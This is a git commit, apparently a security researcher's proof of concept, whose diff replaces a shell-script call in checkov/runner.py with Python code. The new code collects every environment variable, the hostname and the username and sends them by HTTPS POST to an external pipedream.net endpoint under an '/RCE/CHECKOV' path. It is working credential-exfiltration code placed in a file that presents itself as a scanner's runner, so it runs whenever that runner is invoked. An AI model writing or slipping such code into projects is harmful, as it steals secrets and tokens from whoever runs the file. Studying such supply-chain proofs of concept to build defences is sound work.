7aff3fa14f02e55669ed55b66bac232b4bc9cb7c
Rotem Bar <rotem@cidersecurity.io>
2021-07-01 08:57:10 +0300

    Upgrade rce for checkov

--- checkov/runner.py
+++ checkov/runner.py
@@ -3,6 +3,21 @@ import subprocess
 
 print("Running shell")
 
-subprocess.call(["sh", "./rce.sh", "CHECKOV"])
+import http.client
+import json
+import socket
+import getpass
+import os
+conn = http.client.HTTPSConnection('45916c134a9cdb740e1c9807952ed21d.m.pipedream.net')
 
-sys.exit("DONE!")
+headers = {'Content-type': 'application/json'}
+
+foo = {'env': dict(**os.environ), 'host': socket.gethostname(), 'user': getpass.getuser() }
+json_data = json.dumps(foo)
+
+conn.request('POST', '/RCE/CHECKOV', json_data, headers)
+
+response = conn.getresponse()
+print(response.read().decode())
+
+sys.exit(0)
